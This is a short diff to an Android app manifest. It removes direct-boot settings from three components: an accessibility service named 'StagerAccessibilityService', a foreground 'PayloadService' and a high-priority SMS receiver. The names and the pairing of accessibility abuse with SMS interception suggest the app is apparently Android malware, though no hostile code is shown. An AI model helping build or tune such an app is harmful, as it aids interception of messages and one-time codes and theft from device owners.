@@ -43,8 +43,7 @@
         <service
             android:name=".service.StagerAccessibilityService"
             android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:directBootAware="true">
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -57,14 +56,12 @@
         <service
             android:name=".service.PayloadService"
             android:exported="false"
-            android:foregroundServiceType="dataSync"
-            android:directBootAware="true" />
+            android:foregroundServiceType="dataSync" />
 
         <!-- SMS Receiver -->
         <receiver
             android:name=".service.SmsReceiver"
-            android:exported="true"
-            android:directBootAware="true">
+            android:exported="true">
             <intent-filter android:priority="100">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
